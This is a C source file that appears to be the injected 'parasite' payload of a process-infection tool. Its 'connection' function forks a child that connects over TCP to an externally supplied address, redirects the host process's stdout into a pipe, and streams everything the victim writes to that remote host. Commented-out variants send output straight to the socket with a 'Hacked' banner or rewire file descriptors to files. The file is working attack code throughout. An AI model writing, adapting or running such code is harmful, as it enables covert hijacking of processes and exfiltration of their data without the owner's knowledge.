#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <time.h>
#include <fcntl.h>

#include "syscall.h"
#include "string.c"
#include "parasite.h"
#include "infect-rpc.h"

#define NULL ((void *)0)

int connection(void *data){
	char st[] = "I'M TAKAGAWA!\n";
	int pid;
	int size;
/*
	int sock;
	struct sockaddr_in *sockaddr = data;

	
	sock = sys_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	sys_connect(sock, (struct sockaddr *) sockaddr, sizeof(*sockaddr));

	sys_close(1);
	sys_dup2(sock, 1);
	sys_write(1, "Hacked\n", sizeof("Hacked\n"));
*/
	int fds[2];
	sys_pipe2(fds, O_CLOEXEC);
	std_printf("fds[0]:%d, fds[1]:%d\n", fds[0], fds[1]);
	pid = sys_fork();
	if(pid == 0){
		std_printf("child %d\n", sys_getpid());
		sys_close(fds[1]);
		sys_close(0);
		sys_dup2(fds[0], 0);
		char buf[32];
		struct sockaddr_in *sockaddr = data;
		int sock;
		sock = sys_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		sys_connect(sock, (struct sockaddr *) sockaddr, sizeof(*sockaddr));
		
		while(1){
			memset(buf, 0, sizeof(buf));
			size = sys_read(0, buf, sizeof(buf));
			if(size < 0)
				break;
			sys_write(sock, buf, sizeof(buf));
			sys_write(1, buf, sizeof(buf));
		}
	}else{
		std_printf("parent %d\n", sys_getpid());
		sys_close(fds[0]);
		sys_close(1);
		sys_dup2(fds[1], 1);
	}
/*
	char outpath[] = "/hey";
	char inpath[] = "/b.tmp";
	int outfd = sys_open(outpath, O_RDWR);

	sys_dup2(outfd, 1);

	sys_close(outfd);
	
	int infd = sys_open(inpath, O_RDWR);

	sys_dup2(infd, 0);
*/
/*
 * This is multi process for writing
 */
/*	struct timespec tp;
	tp.tv_sec = 5;
	tp.tv_nsec = 0;
	pid = sys_fork();
	if(pid == 0){
		while(1){
			sys_write(0, st, 15); 
			sys_nanosleep(&tp, NULL);
		}
	}
*/


	return 0;
}
